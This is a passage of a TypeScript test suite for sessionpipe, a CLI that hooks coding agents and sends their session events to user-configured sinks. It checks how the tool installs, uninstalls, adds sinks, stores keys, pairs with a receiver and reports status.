    for (const argv of [
      ["sink", "add", "stdout"],
      ["sink", "remove", "board"],
      ["install", "--claude-code", "--backfill", "0"],
      ["connect", "rx.invalid"],
      ["uninstall", "--claude-code"],
      ["update", "off"],
      ["titles", "on"],
    ]) {
      const r = await run(...argv);
      expect(r.err).toHaveBeenCalledWith(expect.stringMatching(/is not valid JSON at (line 1 column|position) \d+,/));
      expect(r.err).toHaveBeenCalledWith(expect.stringContaining("so it was not written over"));
      expect(r.exit).toHaveBeenCalledWith(1);
      expect(readFileSync(config, "utf8")).toBe(text);
    }
    expect(readFileSync(settings, "utf8")).toBe("{}\n");
  });
});

describe.skipIf(process.platform === "win32")("uninstall", () => {
  it("removes what it wrote, the launcher too, and leaves the state", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    await run("install", "--claude-code", "--backfill", "0");
    expect(existsSync(path.join(tmp, "data", "sessionpipe-hook"))).toBe(true);
    writeConfig({ ...cfg(), keep_days: 7 } as never);
    const { text } = await run("uninstall");
    expect(text).toMatch(/✓ claude-code: .*settings\.json/);
    expect(text).toContain("Outbox and state kept under");
    expect(text).toContain("it prunes after 7 days");
    // A hand-edited config with no number there: the default.
    put(config, { ...cfg(), keep_days: null });
    expect((await run("uninstall")).text).toContain("it prunes after 30 days");
    expect(text).toContain("Done. Every config file is byte-identical");
    expect(cfg().harnesses).toEqual({});
    expect(existsSync(path.join(tmp, "data", "sessionpipe-hook"))).toBe(false);
    put(path.join(home, ".claude", "settings.json"), "{broken");
    onPlatform("win32");
    const again = await run("uninstall", "--keep-state");
    expect(again.text).toMatch(/! claude-code: .*settings\.json — /);
    expect(again.text).not.toContain("Outbox and state kept");
  });

  it("names a harness: only that one goes; the launcher and the rest stay", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    await run("install", "--claude-code", "--devin", "--backfill", "0");
    const { text } = await run("uninstall", "--devin");
    expect(text).toMatch(/✓ devin: /);
    expect(text).toContain("Still installed: claude-code.");
    expect(Object.keys(cfg().harnesses)).toEqual(["claude-code"]);
    expect(existsSync(path.join(tmp, "data", "sessionpipe-hook"))).toBe(true);
    expect(readFileSync(path.join(home, ".claude", "settings.json"), "utf8")).toContain("sessionpipe-hook");
    expect((await run("uninstall", "--claude-code")).text).toContain("Still installed: nothing.");
  });

  it("refuses every harness at once while an isolation var leaves one on the real home; --all, or no such vars, go ahead", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    await run("install", "--claude-code", "--backfill", "0");
    // SESSIONPIPE_CONFIG/STATE say "not this machine", but codex would still read ~/.codex.
    vi.stubEnv("CODEX_HOME", undefined as never);
    const r = await run("uninstall");
    expect(r.text).toContain("Refusing an uninstall of every harness");
    expect(r.text).toContain("Name what to remove (--codex)");
    expect(process.exitCode).toBe(2);
    expect(cfg().harnesses["claude-code"]).toBeDefined();
    process.exitCode = undefined;
    expect((await run("uninstall", "--all")).text).toMatch(/✓ claude-code: /);
    expect(cfg().harnesses).toEqual({});
    // With neither isolation var set there is nothing to be outside of: HOME is the sandbox.
    await run("install", "--claude-code", "--backfill", "0");
    vi.stubEnv("SESSIONPIPE_CONFIG", undefined as never);
    vi.stubEnv("SESSIONPIPE_STATE", undefined as never);
    const plain = await run("uninstall");
    expect(plain.text).not.toContain("Refusing");
    expect(plain.text).toMatch(/✓ claude-code: /);
  });
});

describe.skipIf(process.platform === "win32")("sink add | list | remove | test", () => {
  it("a sink crossing tier 0 rewrites the hooks: the full set with one above it, the lean set without", async () => {
    mkdirSync(path.join(home, ".claude"));
    const settings = path.join(home, ".claude", "settings.json");
    put(settings, {});
    await run("install", "--claude-code");
    const hooks = () => Object.keys(JSON.parse(readFileSync(settings, "utf8")).hooks);
    expect(hooks()).not.toContain("PreToolUse");
    const rx = await receiver();
    const quiet = await run("sink", "add", rx.url, "--tier", "0", "--name", "quiet");
    expect(quiet.text).not.toContain("hooking");
    expect(hooks()).not.toContain("PreToolUse");
    const loud = await run("sink", "add", rx.url, "--tier", "1", "--name", "loud");
    expect(loud.text).toContain("A sink above tier 0: hooking every event.");
    expect(loud.text).toMatch(/✓ claude-code: .*settings\.json written/);
    expect(hooks()).toContain("PreToolUse");
    expect(said(await run("status"), "Agents")).toBe("✓ claude-code");
    const gone = await run("sink", "remove", "loud");
    expect(gone.text).toContain("No sink above tier 0 now: hooking one tool event per harness (the heartbeat's).");
    expect(hooks()).not.toContain("PreToolUse");
    expect(said(await run("status"), "Agents")).toBe("✓ claude-code");
  });
  it("a sink crossing tier 0 with no harness hooked leaves the hooks alone", async () => {
    const rx = await receiver();
    const { text } = await run("sink", "add", rx.url, "--tier", "2");
    expect(text).not.toContain("hooking");
    expect(cfg().harnesses).toEqual({});
  });
  it("run from npx, a sink crossing tier 0 leaves the hooks to `install`", async () => {
    mkdirSync(path.join(home, ".claude"));
    const settings = path.join(home, ".claude", "settings.json");
    put(settings, {});
    await run("install", "--claude-code");
    const rx = await receiver();
    vi.mocked(viaNpx).mockReturnValueOnce(true);
    const { text } = await run("sink", "add", rx.url, "--tier", "3", "--name", "loud");
    expect(text).toContain("✓ sink loud");
    expect(text).toContain("run `sessionpipe install` to rewrite them");
    expect(text).not.toContain("hooking");
    expect(Object.keys(JSON.parse(readFileSync(settings, "utf8")).hooks)).not.toContain("PreToolUse");
    expect(rerunGlobally).not.toHaveBeenCalled();
    expect(cfg().sinks.map((s) => s.name)).toEqual(["loud"]);
  });
  it.skipIf(process.platform === "win32")(
    "a sink crossing tier 0 never downgrades hooks a newer sessionpipe wrote",
    async () => {
      mkdirSync(path.join(home, ".claude"));
      const settings = path.join(home, ".claude", "settings.json");
      put(settings, {});
      await run("install", "--claude-code");
      const dist = mkdtempSync(path.join(os.tmpdir(), "sp-dist-"));
      writeFileSync(path.join(dist, "hook.js"), "");
      writeFileSync(path.join(dist, "worker.js"), "");
      installLauncher({ distDir: dist, node: process.execPath, version: "99.0.0" });
      const rx = await receiver();
      const { text } = await run("sink", "add", rx.url, "--tier", "3", "--name", "loud");
      expect(text).toContain("✓ sink loud");
      expect(text).toContain(
        "The hooks need rewriting now and were left alone: refusing to downgrade sessionpipe: 99.0.0 is installed at",
      );
      expect(text).toContain("`sessionpipe update` brings this copy up to date and rewrites them.");
      expect(text).not.toContain("pass --allow-downgrade");
      expect(Object.keys(JSON.parse(readFileSync(settings, "utf8")).hooks)).not.toContain("PreToolUse");
      rmSync(dist, { recursive: true, force: true });
    },
  );
  it("adds a sink named after its host with the receiver's cap and endpoints, then lists it", async () => {
    const rx = await receiver({ wellKnown: { max_tier: 1, endpoints: { events: "/in" } } });
    const { text } = await run("sink", "add", rx.url, "--tier", "3", "--token", "tok", "--pii", "--control");
    expect(text).toContain("--control is ignored");
    expect(text).toContain("receiver's max_tier is 1: sending tier 1, not 3");
    expect(text).toContain(`✓ sink 127.0.0.1:${new URL(rx.url).port}: ${rx.url} at tier 1, pii`);
    expect(text).toContain("tier 3 sends: tier 0 + tool names");
    expect(cfg().sinks[0]).toMatchObject({
      tier: 3,
      max_tier: 1,
      token: "tok",
      pii: true,
      endpoints: { events: "/in" },
    });
    expect(cfg().sinks[0]?.well_known_at).toMatch(/^\d{4}-/);
    const list = await run("sink", "list");
    expect(list.text).toContain("tier 3 (capped 1) pii · tools all");
    await run("sink", "add", "stdout");
    await run("sink", "add", `file:${path.join(tmp, "events.jsonl")}`, "--name", "disk", "--tier", "9");
    await run("sink", "add", `file:${path.join(tmp, "more.jsonl")}`);
    const names = cfg().sinks.map((s) => `${s.name}:${s.tier}`);
    expect(names).toEqual([expect.stringMatching(/^127\.0\.0\.1/), "stdout:0", "disk:3", "file:0"]);
    const noCap = await receiver({ wellKnown: { max_tier: 3 } });
    await run("sink", "add", noCap.url, "--name", "big");
    expect((cfg().sinks.find((s) => s.name === "big") as { endpoints?: unknown }).endpoints).toBeUndefined();
  });

  it("a --tier left off or not a whole number is refused, and no sink is stored", async () => {
    const file = `file:${path.join(tmp, "t.jsonl")}`;
    for (const tier of [["--tier"], ["--tier", "one"], ["--tier", "1.5"], ["--tier", "--name", "x"]]) {
      const r = await run("sink", "add", file, ...tier);
      expect(r.err).toHaveBeenCalledWith(expect.stringMatching(/^sessionpipe: --tier takes 0, 1, 2 or 3[^\n]*\n$/));
      expect(r.exit).toHaveBeenCalledWith(1);
      // At a terminal, the help it points at is the command's own, down to the subcommand.
      const seen = await runAt({ errTty: true, columns: 100 }, "sink", "add", file, ...tier, "--no-color");
      expect(seen.err).toHaveBeenCalledWith(
        expect.stringMatching(/^error {2}--tier takes 0, 1, 2 or 3[^\n]*\ntry {4}sessionpipe sink add --help\n$/),
      );
    }
    const install = await run("install", "--sink", file, "--tier", "two");
    expect(install.err).toHaveBeenCalledWith('sessionpipe: --tier takes 0, 1, 2 or 3, not "two"\n');
    expect(install.lines).toEqual([]);
    for (const argv of [["connect", "r.invalid"], ["control", "pair", "r.invalid"], ["tail"]]) {
      const r = await run(...argv, "--tier", "x");
      expect(r.err).toHaveBeenCalledWith('sessionpipe: --tier takes 0, 1, 2 or 3, not "x"\n');
      expect(r.lines).toEqual([]);
      const about = argv[0] === "control" ? "control pair" : argv[0];
      const seen = await runAt({ errTty: true, columns: 100 }, ...argv, "--tier", "x", "--no-color");
      expect(seen.err).toHaveBeenCalledWith(
        `error  --tier takes 0, 1, 2 or 3, not "x"\ntry    sessionpipe ${about} --help\n`,
      );
    }
    expect(cfg().sinks).toEqual([]);
  });

  it("--tools says which tool events a sink is sent; it stays when the sink is added again without it", async () => {
    const rx = await receiver();
    // The receiver's well-known file says nothing about tool events: every one, as before.
    const add = await run("sink", "add", rx.url, "--tier", "1", "--name", "rx");
    expect(add.text).toContain("tool events: every tool call (--tools main: a subagent's at most one a minute)");
    expect(cfg().sinks[0]?.tools).toBeUndefined();
    await run("sink", "add", rx.url, "--tier", "1", "--name", "rx", "--tools", "beat");
    expect(cfg().sinks[0]?.tools).toBe("beat");
    const again = await run("sink", "add", rx.url, "--tier", "2", "--name", "rx");
    expect(again.text).toContain("tool events: at most one tool call a minute per session");
    expect(cfg().sinks[0]).toMatchObject({ tier: 2, tools: "beat" });
    expect((await run("sink", "list")).text).toContain("tier 2 · tools beat");
    const bad = await run("sink", "add", rx.url, "--name", "rx", "--tools", "some");
    expect(bad.text).toContain('--tools takes all, main or beat (got "some"): nothing was changed');
    expect(process.exitCode).toBe(2);
    process.exitCode = undefined;
    expect(cfg().sinks[0]).toMatchObject({ tier: 2, tools: "beat" });
    await run("sink", "add", "stdout", "--tier", "1", "--tools", "all");
    expect((await run("sink", "list")).text).toMatch(/stdout .*tier 1 · tools all/);
    const file = await run("sink", "add", `file:${path.join(tmp, "t.jsonl")}`, "--tier", "1", "--name", "disk");
    expect(file.text).toContain("tool events: every tool call (--tools main: a subagent's at most one a minute)");
    // A tier-0 sink is sent no tool events: nothing to say about them.
    const quiet = await run("sink", "add", rx.url, "--tier", "0", "--name", "quiet");
    expect(quiet.text).not.toContain("tool events:");
    expect((await run("sink", "list")).text).not.toMatch(/quiet .*tools/);
  });

  it("a receiver that asks for thinned tool events in its well-known file gets them, unless the owner says otherwise", async () => {
    const rx = await receiver({ wellKnown: { max_tier: 3, tools: "main" } });
    const { text } = await run("sink", "add", rx.url, "--tier", "2", "--token", "tok");
    expect(text).toContain("the receiver asks for tool events `main` (--tools all keeps every one)");
    expect(text).toContain("tool events: the main thread's tool calls as they happen");
    expect(cfg().sinks[0]).toMatchObject({ receiver_tools: "main" });
    expect(cfg().sinks[0]).not.toHaveProperty("tools");
    // The owner's own choice is kept, and the receiver's ask is no news then.
    const all = await run("sink", "add", rx.url, "--tier", "2", "--token", "tok", "--tools", "all");
    expect(all.text).not.toContain("the receiver asks for");
    expect(all.text).toContain("tool events: every tool call");
    expect(cfg().sinks[0]).toMatchObject({ tools: "all", receiver_tools: "main" });
    // A receiver that says nothing is sent every tool event, as before this release.
    const quiet = await receiver({ wellKnown: { max_tier: 3 } });
    const q = await run("sink", "add", quiet.url, "--tier", "2", "--token", "tok", "--name", "quiet");
    expect(q.text).toContain("tool events: every tool call");
    expect(cfg().sinks.find((s) => s.name === "quiet")).not.toHaveProperty("receiver_tools");
  });
  it("a receiver without a readable well-known file is added anyway, at the tier asked for", async () => {
    const rx = await receiver({ wellKnownStatus: 404 });
    const bad = await run("sink", "add", rx.url, "--tier", "2");
    expect(bad.text).toContain("has no readable /.well-known/sessionpipe (HTTP 404); added anyway, at tier 2");
    const gone = await run("sink", "add", "http://127.0.0.1:1", "--name", "gone");
    expect(gone.text).toContain("has no readable /.well-known/sessionpipe (fetch failed); added anyway, at tier 0");
    expect(cfg().sinks.map((s) => s.max_tier)).toEqual([undefined, undefined]);
  });

  it("changing a sink's tier keeps the key it has, wherever it lives; a new key replaces it", async () => {
    writeConfig({
      sinks: [
        { name: "kc", url: "https://kc.invalid", tier: 1, token_in: "keychain" },
        { name: "f", url: "https://f.invalid", tier: 1, token: "old", secret: "whsec_x" },
      ],
      harnesses: {},
    } as never);
    vi.mocked(sinkWithSecrets).mockImplementation((s) => (s.token_in ? { ...s, token: "from-keychain" } : s));
    await run("sink", "add", "https://kc.invalid", "--name", "kc", "--tier", "2");
    expect(cfg().sinks.find((s) => s.name === "kc")).toMatchObject({ tier: 2, token_in: "keychain" });
    await run("sink", "add", "https://f.invalid", "--name", "f", "--tier", "2");
    expect(cfg().sinks.find((s) => s.name === "f")).toMatchObject({ tier: 2, token: "old", secret: "whsec_x" });
    await run("sink", "add", "https://kc.invalid", "--name", "kc", "--token", "new");
    expect(dropSinkSecrets).toHaveBeenCalledWith(expect.objectContaining({ name: "kc", token_in: "keychain" }));
    expect(cfg().sinks.find((s) => s.name === "kc")).toMatchObject({ token: "new" });
    expect(cfg().sinks.find((s) => s.name === "kc")?.token_in).toBeUndefined();
    await run("sink", "add", "https://f.invalid", "--name", "f", "--secret", "whsec_y");
    expect(cfg().sinks.find((s) => s.name === "f")).toMatchObject({ token: "old", secret: "whsec_y" });
    // A key in a keychain this session can't read, and a new secret given: the secret
    // is set, and nothing unreadable is carried over.
    writeConfig({
      sinks: [{ name: "kc", url: "https://kc.invalid", tier: 1, token_in: "keychain" }],
      harnesses: {},
    } as never);
    vi.mocked(sinkWithSecrets).mockReturnValue(null);
    await run("sink", "add", "https://kc.invalid", "--name", "kc", "--secret", "whsec_z");
    expect(cfg().sinks[0]).toEqual({ name: "kc", url: "https://kc.invalid", tier: 0, pii: false, secret: "whsec_z" });
  });

  it("lists nothing, removes by name, and says when there is no such sink", async () => {
    expect((await run("sink", "list")).lines).toEqual(["  no sinks"]);
    writeConfig({
      sinks: [
        { name: "a", url: "stdout", tier: 0, control: true, paused: "HTTP 401", token_in: "keychain" },
        { name: "b", url: "stdout", tier: 2, max_tier: 3 },
      ],
      harnesses: {},
    } as never);
    expect((await run("sink", "list")).text).toContain("tier 0 control PAUSED HTTP 401");
    expect((await run("sink", "remove", "a")).lines).toEqual(["  ✓ removed a"]);
    expect(dropSinkSecrets).toHaveBeenCalledTimes(1);
    expect((await run("sink", "remove", "a")).lines).toEqual(["  no sink named a"]);
    expect(cfg().sinks.map((s) => s.name)).toEqual(["b"]);
    for (const argv of [["sink"], ["sink", "add"], ["sink", "remove"], ["sink", "test"], ["sink", "x"]])
      expect((await run(...argv)).text).toMatch(/^usage: sessionpipe sink add/);
  });

  it("tests a sink with a heartbeat and its forget, and reports what the receiver said", async () => {
    const ok = await receiver({ body: { accepted: 2 } });
    const refused = await receiver({ status: 401, body: { reason: "bad key" } });
    writeConfig({
      sinks: [
        { name: "ok", url: ok.url, tier: 1, token: "t" },
        { name: "no", url: refused.url, tier: 1 },
        { name: "paused", url: "stdout", tier: 0, paused: "HTTP 401" },
        { name: "out", url: "stdout", tier: 0 },
      ],
      harnesses: {},
    } as never);
    expect((await run("sink", "test", "ok")).lines).toEqual(["  ✓ ok: 200 accepted 2 (a heartbeat and its forget)"]);
    expect((ok.posts[0] as { events: { type: string }[] }).events.map((e) => e.type)).toEqual([
      "session.heartbeat",
      "session.forgotten",
    ]);
    expect((await run("sink", "test", "no")).lines).toEqual(["  ✗ no: 401 bad key (pause)"]);
    expect((await run("sink", "test", "paused")).lines).toEqual(["  sink type not supported yet"]);
    expect((await run("sink", "test", "nope")).lines).toEqual(["  no sink named nope"]);
    const write = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    expect((await run("sink", "test", "out")).lines).toEqual(["  ✓ out: ok accepted 2 (a heartbeat and its forget)"]);
    expect(write).toHaveBeenCalled();
    // A receiver that said nothing but yes, or nothing at all.
    const send = vi.spyOn(HttpSink.prototype, "send");
    send.mockResolvedValueOnce({ ok: true, acknowledged: 2, status: 202 });
    expect((await run("sink", "test", "ok")).lines).toEqual(["  ✓ ok: 202 accepted 2 (a heartbeat and its forget)"]);
    send.mockResolvedValueOnce({ ok: false, acknowledged: 0, action: "retry" });
    expect((await run("sink", "test", "ok")).lines).toEqual(["  ✗ ok:   (retry)"]);
  });
});

describe.skipIf(process.platform === "win32")("secrets", () => {
  it("says where each key lives and whether this session can read it", async () => {
    const empty = await run("secrets");
    expect(empty.lines).toEqual(["  no keys on this machine", `  best store from this session: ${storeLabel("file")}`]);
    writeConfig({
      sinks: [
        { name: "kc", url: "https://kc.invalid", tier: 1, token_in: "keychain" },
        { name: "locked", url: "https://l.invalid", tier: 1, token_in: "secret-service" },
        { name: "f", url: "https://f.invalid", tier: 1, token: "t" },
        { name: "none", url: "stdout", tier: 0 },
      ],
      harnesses: {},
    } as never);
    put(path.join(tmp, "config", "control.json"), {
      name: "box",
      folders: [],
      mode: "safe",
      receivers: [
        { url: "https://a.invalid", machine: "m1", token: "t", keys: [] },
        { url: "https://b.invalid", machine: "m2", token_in: "keychain", keys: [] },
        { url: "https://c.invalid", machine: "m3", token_in: "keychain", keys: [] },
      ],
    });
    vi.mocked(sinkWithSecrets).mockImplementation((s) => (s.name === "kc" ? { ...s, token: "x" } : null));
    // The keychain tool hands back m3's token and knows nothing of m2's.
    vi.mocked(spawnSync).mockImplementation(
      (cmd: string, args: readonly string[] | undefined) =>
        ({
          status: cmd === "security" && args?.includes("control:m3") ? 0 : 44,
          stdout: cmd === "security" && args?.includes("control:m3") ? "tok\n" : "",
        }) as never,
    );
    const { text } = await run("secrets");
    expect(text).toContain("sink kc                   the macOS Keychain\n");
    expect(text).toContain(
      "sink locked               the Secret Service keyring — can't be read from this session (locked?)",
    );
    expect(text).toContain(`sink f                    ${config} (${fileKept()})`);
    expect(text).toContain("sink none                 no key");
    expect(text).toContain(`control a.invalid         control.json (${fileKept()})`);
    expect(text).toContain("control b.invalid         the macOS Keychain — can't be read from this session (locked?)");
    expect(text).toContain("control c.invalid         the macOS Keychain\n");
  });

  it("moves the keys into a store, or back, and names what stayed", async () => {
    expect((await run("secrets", "move", "vault")).lines).toEqual([
      "usage: sessionpipe secrets move keychain|secret-service|file",
    ]);
    expect((await run("secrets", "move", "file")).lines).toEqual([`  nothing to move to ${storeLabel("file")}`]);
    vi.mocked(moveSinkSecrets).mockReturnValue({ moved: ["rx"], kept: ["locked"] });
    vi.mocked(moveControlSecrets).mockReturnValue({ moved: ["https://a.invalid"], kept: [] });
    expect((await run("secrets", "move", "keychain")).lines).toEqual([
      "  ✓ moved to the macOS Keychain: rx, https://a.invalid",
      "  ! left where they are (unreadable here, or the macOS Keychain refused them): locked",
    ]);
  });
});

describe.skipIf(process.platform === "win32")("connect", () => {
  it("needs a receiver, and from npx hands itself to a persistent copy first", async () => {
    expect((await run("connect")).text).toMatch(/^usage: sessionpipe connect <receiver>/);
    expect((await run("connect", "--tier", "2")).text).toMatch(/^usage:/);
    vi.mocked(viaNpx).mockReturnValueOnce(true);
    await run("connect", "rx.invalid");
    expect(rerunGlobally).toHaveBeenCalledWith(["connect", "rx.invalid"], expect.any(Function), {
      allowDowngrade: false,
    });
    expect(controlMain).not.toHaveBeenCalled();
  });

  it("does everything at once: hooks, accounts, pairing from this folder, the sink at tier 2, keys, backfill", async () => {
    const rx = await receiver({ wellKnown: { max_tier: 3 } });
    put(path.join(home, ".claude", "settings.json"), {});
    put(path.join(home, ".claude-second", "settings.json"), {});
    put(path.join(home, ".claude-plain", "settings.json"), {});
    put(path.join(home, ".claude-odd", "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    writeConfig({ sinks: [{ name: "rx", url: `${rx.url}/`, tier: 1, token: "key" }], harnesses: {} } as never);
    const rows = [{ session: { id: "aaaaaaaa-0000-4000-8000-000000000009", cwd: home }, started_at: 1, last_at: 2 }];
    vi.spyOn(claudeCode, "backfill").mockReturnValue(rows);
    vi.mocked(bestStore).mockReturnValue("keychain");
    vi.mocked(moveSinkSecrets).mockReturnValue({ moved: ["rx"], kept: [] });
    vi.mocked(moveControlSecrets).mockReturnValue({ moved: [], kept: ["https://x"] });
    const { text } = await run(
      "connect",
      `${rx.url}/`,
      "--mode",
      "auto",
      "--no-service",
      "--rename-machine",
      "--machine",
      "lab",
    );
    const host = new URL(rx.url).host;
    expect(text).toContain(`Connecting lab to ${host}.`);
    expect(text).toContain("✓ hook launcher:");
    expect(text).toMatch(/✓ Claude Code .*\.claude: signed in \(claude\.ai, max\)/);
    expect(text).toMatch(/✓ Claude Code .*\.claude-plain: signed in\n/);
    expect(text).toMatch(
      /! Claude Code .*\.claude-second: not signed in as this shell sees it — `CLAUDE_CONFIG_DIR=.*claude auth login`\n/,
    );
    expect(text).not.toMatch(/Claude Code .*\.claude-odd/);
    expect(controlMain).toHaveBeenCalledWith(
      [
        "control",
        "pair",
        rx.url,
        "--mode",
        "auto",
        "--tier",
        "2",
        "--name",
        "lab",
        "--folder",
        process.cwd(),
        "--no-service",
      ],
      expect.any(Function),
      realDist,
      VIEW,
    );
    expect(text).not.toContain("Safe mode:");
    expect(text).toContain("✓ Sink rx: tier 2 (was 1) — sends tier 1 + your prompts");
    expect(text).toContain("✓ Keys: in the macOS Keychain (left in the file: https://x)");
    expect(text).toContain("✓ Backfill: 1 session from the last 30 days");
    expect(text).toContain(`Done: lab reports to ${host} and takes messages you sign on a device it trusts.`);
    expect(cfg().sinks[0]).toMatchObject({ tier: 2, max_tier: 3, well_known_at: expect.any(String) });
  });

  it("already paired with a keyed sink: nothing to approve; the folders come from recent sessions when run from home", async () => {
    const rx = await receiver({ wellKnown: {} });
    put(path.join(tmp, "config", "control.json"), {
      name: "box",
      folders: [],
      mode: "auto",
      receivers: [{ url: rx.url, machine: "m_1", token: "t", keys: [] }],
    });
    writeConfig({ sinks: [{ name: "rx", url: rx.url, tier: 3, token_in: "keychain" }], harnesses: {} } as never);
    vi.stubEnv("SSH_CONNECTION", "10.0.0.1 1 10.0.0.2 22");
    const paired = await run("connect", rx.url, "--tier", "3");
    expect(paired.text).toContain("! No coding agent here yet");
    expect(paired.text).toContain(`✓ Already paired with ${new URL(rx.url).host} as m_1: nothing to approve.`);
    expect(paired.text).toContain("✓ Sink rx: tier 3 — sends everything");
    expect(paired.text).toContain("no unlocked keychain in this session (an ssh shell)");
    expect(controlMain).not.toHaveBeenCalled();

    // A paired daemon whose sink lost its key pairs again, in the daemon's own mode,
    // for the folders the last sessions ran in — this ran from the home folder.
    writeConfig({ sinks: [{ name: "rx", url: rx.url, tier: 3 }], harnesses: {} } as never);
    vi.spyOn(os, "homedir").mockReturnValue(home);
    vi.spyOn(process, "cwd").mockReturnValue(home);
    put(path.join(home, ".claude", "settings.json"), {});
    const proj = path.join(home, "proj");
    mkdirSync(proj);
    vi.spyOn(claudeCode, "backfill").mockReturnValue([
      { session: { id: "aaaaaaaa-0000-4000-8000-000000000010", cwd: proj }, started_at: 1, last_at: 5 },
      { session: { id: "aaaaaaaa-0000-4000-8000-000000000011", cwd: home }, started_at: 1, last_at: 9 },
      { session: { id: "aaaaaaaa-0000-4000-8000-000000000012" }, started_at: 1, last_at: 3 },
      {
        session: { id: "aaaaaaaa-0000-4000-8000-000000000013", cwd: path.join(home, "gone") },
        started_at: 1,
        last_at: 7,
      },
    ]);
    const again = await run("connect", rx.url, "--mode", "bogus");
    // Printed as the person sees it: under the sandbox HOME, so with a tilde.
    expect(again.text).toContain("Folders from your recent sessions: ~/proj");
    expect(controlMain).toHaveBeenCalledWith(
      ["control", "pair", rx.url, "--mode", "auto", "--tier", "3", "--name", "box", "--folder", proj],
      expect.any(Function),
      realDist,
      VIEW,
    );
    expect(again.text).not.toContain("Safe mode:");
  });

  it("from home with no project anywhere: no folder, said plainly; safe mode by default; --folder names them", async () => {
    const rx = await receiver();
    vi.spyOn(os, "homedir").mockReturnValue(home);
    vi.spyOn(process, "cwd").mockReturnValue(home);
    vi.mocked(bestStore).mockReturnValueOnce("keychain");
    const none = await run("connect", new URL(rx.url).host);
    expect(none.text).toContain("! No folder for sessions you message yet");
    expect(none.text).toContain("Safe mode: `sessionpipe control mode auto`");
    expect(none.text).toContain(
      `! No sink for ${new URL(rx.url).host}: \`sessionpipe sink add https://${new URL(rx.url).host} --token <key> --tier 2\``,
    );
    expect(none.text).toContain("✓ Keys: in the macOS Keychain\n");
    expect(none.text).not.toContain("(an ssh shell)");
    expect(controlMain).toHaveBeenLastCalledWith(
      expect.arrayContaining(["--mode", "safe", "--tier", "2"]),
      expect.any(Function),
      realDist,
      VIEW,
    );
    const flagged = await run("connect", rx.url, "--folder", path.join(home, "a"), "--folder", path.join(home, "b"));
    expect(flagged.text).not.toContain("No folder for sessions");
    expect(flagged.text).toContain("Keys: in ");
    expect(flagged.text).toContain("no unlocked keychain in this session\n");
    expect(controlMain).toHaveBeenLastCalledWith(
      expect.arrayContaining(["--folder", path.join(home, "a"), "--folder", path.join(home, "b")]),
      expect.any(Function),
      realDist,
      VIEW,
    );
    // Inherit is taken as named, like the other two.
    const inherit = await run("connect", rx.url, "--mode", "inherit", "--folder", path.join(home, "a"));
    expect(inherit.text).not.toContain("Safe mode:");
    expect(controlMain).toHaveBeenLastCalledWith(
      expect.arrayContaining(["--mode", "inherit"]),
      expect.any(Function),
      realDist,
      VIEW,
    );
  });

  it("over ssh on a Mac, a signed-out account says why the login can't be read; elsewhere not", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    put(path.join(home, ".claude-second", "settings.json"), {});
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    vi.stubEnv("SSH_CONNECTION", "10.0.0.1 1 10.0.0.2 22");
    onPlatform("darwin");
    expect((await run("connect", "rx.invalid")).text).toContain(
      "(over ssh a Mac's keychain login can't be read; log in at the screen)",
    );
    onPlatform("linux");
    expect((await run("connect", "rx.invalid")).text).not.toContain("over ssh a Mac's");
  });
});

describe.skipIf(process.platform === "win32")("status", () => {
  it("a few lines: the verdict, then each group with what is wrong said and what is fine named; the rest is doctor's and the JSON's", async () => {
    put(path.join(home, ".claude", "settings.json"), {});
    await run("install", "--claude-code", "--backfill", "0");
    writeConfig({
      ...cfg(),
      harnesses: { ...cfg().harnesses, "gemini-cli": { enabled: true } },
      sinks: [
        { name: "rx", url: "https://rx.invalid", tier: 3, max_tier: 1, paused: "HTTP 401" },
        { name: "out", url: "stdout", tier: 0 },
        { name: "done", url: "stdout", tier: 0 },
      ],
    } as never);
    const outbox = new Outbox(state);
    outbox.append({ harness: "claude-code", session: "s1" }, [event("session.heartbeat", {})]);
    outbox.append({ harness: "claude-code", session: "s2" }, [event("session.heartbeat", {})]);
    const size = readFileSync(outbox.file({ harness: "claude-code", session: "s2" })).length;
    put(path.join(state, "cursors", "done.json"), { "claude-code/s1": 100000, "claude-code/s2": size });
    put(path.join(state, "timing.jsonl"), '{"ms":3}\n{"ms":-1}\n{"ms":9}\n');
    put(path.join(state, "jobs", "a.json"), {});
    put(path.join(state, "jobs", "b.tmp"), {});
    // A session file that vanished between the listing and its size.
    symlinkSync(path.join(state, "gone.jsonl"), path.join(state, "outbox", "claude-code", "dangling.jsonl"));
    const { lines } = await run("status");
    // The verdict counts what needs a look (the sink that stopped); what to do is doctor's.
    expect(lines).toEqual([
      "! 1 thing needs attention",
      "",
      expect.stringMatching(new RegExp(`^ {2}✓ This computer {2}\\S+ \\(sessionpipe ${quoted(VERSION)}\\), hooks$`)),
      "  ✓ Agents         claude-code",
      "  ✗ Reports to     rx: tier 1 · stopped: HTTP 401, out, done",
      "  · Messages from  nobody: this computer takes no messages",
      "  · Updates        by hand: this copy isn't a global npm install (npx, a checkout or a dev build)",
      "",
      "  `sessionpipe doctor` says what to do about it.",
    ]);
    // Doctor's page has what those lines leave out: the agent that is gone, what waits.
    steadyHook();
    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
    const d = await run("doctor");
    expect(d.text).toMatch(
      new RegExp(`\\nThis computer\\n {2}✓ \\S+ +sessionpipe ${quoted(VERSION)} · node ${quoted(process.version)}\\n`),
    );
    expect(d.text).toContain("  · background service  not set up: nothing here needs it yet\n");
    expect(d.text).toContain(`  ✓ hooks               run sessionpipe ${VERSION}\n`);
    expect(group(d, "Agents")).toEqual([
      "  ✓ claude-code  hooked · ~/.claude/settings.json",
      // In config.json, and its folder is gone.
      "  · gemini-cli   was hooked here, and is no longer found on this computer",
    ]);
    expect(group(d, "Reports to")).toEqual([
      "  ✗ rx               tier 1 · stopped: HTTP 401",
      "  ✓ out              tier 0 · 2 sessions waiting to be sent",
      "  ✓ done             tier 0 · up to date",
      "  · still to handle  1 hook event waiting on this computer",
    ]);
    expect(group(d, "Messages from")).toEqual(["  · nobody  this computer takes no messages"]);
    expect(group(d, "Updates")).toEqual([
      "  · by hand  this copy isn't a global npm install (npx, a checkout or a dev build)",
    ]);
    process.exitCode = undefined;
    // The hooks' in-process timing is for a program now: the JSON has it, and the jobs too.
    const j = JSON.parse((await run("status", "--json")).lines.join("\n"));
